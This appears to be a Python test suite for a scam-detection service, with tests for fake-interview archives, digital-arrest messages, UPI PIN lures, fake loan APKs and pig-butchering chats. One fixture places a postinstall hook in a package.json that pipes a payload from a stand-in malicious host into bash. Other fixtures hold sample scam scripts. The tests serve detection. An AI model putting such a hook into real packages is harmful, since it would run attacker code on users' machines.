"""
LifeLens Ω — Phase G: New Detectors Test Suite
Comprehensive tests for all 7 Phase G detector engines:
1. Fake-interview "technical test" safety scanner (STATIC analysis only, never executes code)
2. Digital-arrest / fake-officer pattern pack (India-focused, Hindi/Hinglish)
3. Employer-side candidate identity checks (reverse direction)
4. Voice-clone phone-call flow (code word + callback; no video)
5. Quishing (QR) checker, UPI collect-request explainer, fake loan-APK checks
6. Investment/crypto platform verifier (regulator registries, domain age)
7. Romance/"pig-butchering" 6-stage trajectory engine mode
"""
import io
import zipfile
import pytest
from datetime import datetime, timezone
from fastapi.testclient import TestClient

from apps.api.app.main import app
from apps.api.app.detectors.tech_test_scanner import TechTestSafetyScanner, ScanResult
from apps.api.app.detectors.digital_arrest_pack import DigitalArrestPatternPack
from apps.api.app.detectors.candidate_identity_checker import CandidateIdentityChecker
from apps.api.app.detectors.voice_clone_flow import VoiceCloneProtectionFlow
from apps.api.app.detectors.quishing_upi_loan_checker import (
    QuishingChecker,
    UPICollectExplainer,
    FakeLoanAPKChecker,
)
from apps.api.app.detectors.investment_verifier import InvestmentPlatformVerifier
from apps.api.app.detectors.romance_pig_butchering import PigButcheringTrajectoryEngine


client = TestClient(app)


# ── 1. Tech Test Static Scanner Tests ──────────────────────────────────────────

def test_tech_test_scanner_catches_malicious_npm_postinstall():
    """Verify scanner flags malicious postinstall scripts without executing code (§STATIC only)."""
    scanner = TechTestSafetyScanner()

    # Create mock zip archive in-memory
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w") as zf:
        zf.writestr(
            "package.json",
            '{"name": "test-assignment", "scripts": {"postinstall": "curl -s http://malicious.ru/payload | bash"}}',
        )
        zf.writestr("index.js", 'console.log("hello world");')
    zip_bytes = zip_buffer.getvalue()

    result = scanner.scan_archive_bytes(zip_bytes, filename="interview_takehome.zip")
    assert result.is_safe is False
    assert result.risk_score >= 0.8
    assert result.verdict == "Request looks high-risk"
    assert any("postinstall" in r.lower() for r in result.risk_indicators)
    # Assert code was NOT executed
    assert result.execution_performed is False


def test_tech_test_scanner_catches_fake_codec_download_lures():
    """Verify scanner detects 'download this to fix your camera' lures in instructions."""
    scanner = TechTestSafetyScanner()

    readme_content = (
        "# Take Home Task\n\n"
        "To start the technical interview, please download our camera codec fix from "
        "https://interview-verify-camera.org/setup.exe before running the test."
    )
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w") as zf:
        zf.writestr("README.md", readme_content)
    zip_bytes = zip_buffer.getvalue()

    result = scanner.scan_archive_bytes(zip_bytes, filename="assessment.zip")
    assert result.is_safe is False
    assert any("camera" in r.lower() or "codec" in r.lower() for r in result.risk_indicators)


# ── 2. Digital Arrest Pattern Pack Tests ──────────────────────────────────────

def test_digital_arrest_pack_detects_hindi_hinglish_and_enforcement():
    """Verify pattern pack catches digital arrest, CBI, police, customs, and Hinglish phrasing."""
    pack = DigitalArrestPatternPack()

    cases = [
        ("Aapka digital arrest warrant nikla hai, video call pe aao.", True, "Digital Arrest / Hinglish Warrant"),
        ("This is Mumbai Police Cyber Crime cell. Illegal parcel sent in your Aadhaar.", True, "Police / Aadhaar courier lure"),
        ("Enforcement Directorate summons under PMLA act, join immediately.", True, "ED / PMLA intimidation"),
        ("Normal project review meeting scheduled for tomorrow at 10 AM.", False, "Benign"),
    ]

    for text, expected_flag, label in cases:
        assessment = pack.evaluate_text(text)
        if expected_flag:
            assert assessment.is_flagged is True, f"Failed for case: {label}"
            assert assessment.risk_score >= 0.70
            assert assessment.verdict == "Request looks high-risk"
            assert len(assessment.matched_patterns) > 0
        else:
            assert assessment.is_flagged is False, f"False positive for case: {label}"
            assert assessment.verdict == "Verification step completed"


# ── 3. Employer-Side Candidate Identity Checks ─────────────────────────────────

def test_employer_side_candidate_identity_checker():
    """Verify candidate interview integrity detection (proxy candidate & lip-sync variance)."""
    checker = CandidateIdentityChecker()

    candidate_telemetry = {
        "candidate_id": "cand_441",
        "audio_video_desync_ms": 280,  # High desync indicative of virtual audio routing / proxy
        "tab_switches_per_min": 18,
        "multiple_faces_detected": True,
        "unnatural_speech_cadence_score": 0.85,
    }

    report = checker.evaluate_candidate_session(candidate_telemetry)
    assert report.integrity_verdict == "Needs Verification"
    assert report.risk_score >= 0.65
    assert any("audio-video desync" in a.lower() for a in report.anomalies)
    assert any("multiple faces" in a.lower() for a in report.anomalies)


# ── 4. Voice-Clone Phone-Call Flow Tests ──────────────────────────────────────

def test_voice_clone_phone_call_flow():
    """Verify audio-only code word verification and out-of-band callback protocol."""
    flow = VoiceCloneProtectionFlow()

    # Generate urgent voice challenge
    challenge = flow.initiate_challenge(caller_claimed_name="Son", scenario="Kidnapping / Bail Emergency")
    assert challenge.code_word is not None
    assert challenge.challenge_question is not None
    assert len(challenge.callback_protocols) >= 3

    # Correct response verifies
    verify_success = flow.verify_response(challenge.challenge_id, challenge.code_word)
    assert verify_success.is_verified is True
    assert verify_success.verdict == "Verification step completed"

    # Incorrect response raises alert
    verify_fail = flow.verify_response(challenge.challenge_id, "WRONG_ANSWER")
    assert verify_fail.is_verified is False
    assert verify_fail.verdict == "Request looks high-risk"


# ── 5. Quishing, UPI Collect & Fake Loan-APK Tests ─────────────────────────────

def test_upi_collect_explainer_detects_pin_deception():
    """Verify UPI explainer clarifies that entering UPI PIN NEVER receives money."""
    explainer = UPICollectExplainer()

    deceptive_message = "Enter your UPI PIN on this Google Pay link to receive cashback of Rs 5000."
    assessment = explainer.analyze_request(deceptive_message, claimed_amount=5000.0, is_collect_request=True)

    assert assessment.is_deceptive is True
    assert assessment.verdict == "Request looks high-risk"
    assert "Entering your UPI PIN always DEDUCTS money from your bank account" in assessment.educational_warning


def test_quishing_checker_decodes_and_validates_qr():
    """Verify Quishing checker parses QR payload and checks target destination through SSRFShield."""
    checker = QuishingChecker()

    # QR containing lookalike meeting or phishing URL
    qr_payload = "https://zoom-secure-verify.com/login"
    assessment = checker.inspect_qr_target(qr_payload)
    assert assessment.is_safe is False
    assert assessment.verdict == "Request looks high-risk"
    assert assessment.risk_score >= 0.70


def test_fake_loan_apk_manifest_checker():
    """Verify static analysis flags predatory loan APKs requesting intrusive permissions."""
    checker = FakeLoanAPKChecker()

    # Dangerous permissions typical of predatory black-hat loan apps
    apk_manifest = {
        "package_name": "com.quickinstantcash.loan",
        "permissions": [
            "android.permission.READ_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.RECEIVE_SMS",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.CAMERA",
        ],
        "claimed_apr_percent": 180.0,  # 180% APR predatory
    }

    report = checker.audit_manifest(apk_manifest)
    assert report.is_predatory is True
    assert report.verdict == "Request looks high-risk"
    assert "Intrusive contact harvesting" in report.findings[0]


# ── 6. Investment / Crypto Platform Verifier Tests ─────────────────────────────

def test_investment_verifier_checks_regulator_and_domain_age():
    """Verify platform verifier checks official regulators (SEBI/SEC/FCA) and domain age."""
    verifier = InvestmentPlatformVerifier()

    # Suspicious brand-new crypto arbitrage platform
    unregistered_platform = {
        "platform_name": "GlobalQuantumTradingFX",
        "domain": "quantum-arbitrage-yield.biz",
        "domain_age_days": 12,  # Brand new domain
        "claimed_guaranteed_return_daily_percent": 5.0,  # 5% daily = guaranteed Ponzi
    }

    assessment = verifier.verify_platform(unregistered_platform)
    assert assessment.is_registered is False
    assert assessment.risk_score >= 0.85
    assert assessment.verdict == "Request looks high-risk"
    assert any("Domain is only 12 days old" in f for f in assessment.findings)
    assert any("Guaranteed daily return" in f for f in assessment.findings)


# ── 7. Romance / "Pig-Butchering" Trajectory Mode Tests ────────────────────────

def test_romance_pig_butchering_6_stage_trajectory():
    """Verify 6-stage trajectory engine correctly classifies pig-butchering grooming stages."""
    engine = PigButcheringTrajectoryEngine()

    interaction_history = [
        {"day": 1, "text": "Hi, I think I sent this WhatsApp to the wrong number, but you seem nice."},
        {"day": 5, "text": "Good morning dear, I feel such a deep spiritual connection with you."},
        {"day": 12, "text": "My uncle works in gold crypto arbitrage, I made $12,000 yesterday on this private platform."},
        {"day": 15, "text": "You can try with just $500, I will guide you to withdraw profits immediately."},
        {"day": 20, "text": "You must deposit $15,000 now to unlock your VIP capital and pay the liquidity tax."},
    ]

    trajectory = engine.evaluate_history(interaction_history)
    assert trajectory.current_stage == "STAGE_5_CAPITAL_FREEZE_EXTORTION"
    assert trajectory.overall_risk_score >= 0.90
    assert trajectory.verdict == "Request looks high-risk"
    assert len(trajectory.stage_transitions) >= 4


# ── 8. API Endpoint Integration Tests ──────────────────────────────────────────

def test_api_detectors_endpoints():
    """Integration test for new Phase G REST endpoints."""
    # Tech test scan endpoint
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w") as zf:
        zf.writestr("package.json", '{"scripts": {"test": "jest"}}')
    zip_bytes = zip_buffer.getvalue()

    resp = client.post(
        "/api/v1/detectors/tech-test/scan",
        files={"file": ("clean_test.zip", zip_bytes, "application/zip")},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["is_safe"] is True

    # Digital arrest check endpoint
    resp_da = client.post(
        "/api/v1/detectors/digital-arrest/check",
        json={"text": "Aapka digital arrest hua hai, join immediately."},
    )
    assert resp_da.status_code == 200
    assert resp_da.json()["is_flagged"] is True

    # UPI collect check endpoint
    resp_upi = client.post(
        "/api/v1/detectors/upi/explain",
        json={"message": "Enter UPI PIN to receive 2000 cashback", "is_collect_request": True},
    )
    assert resp_upi.status_code == 200
    assert resp_upi.json()["is_deceptive"] is True
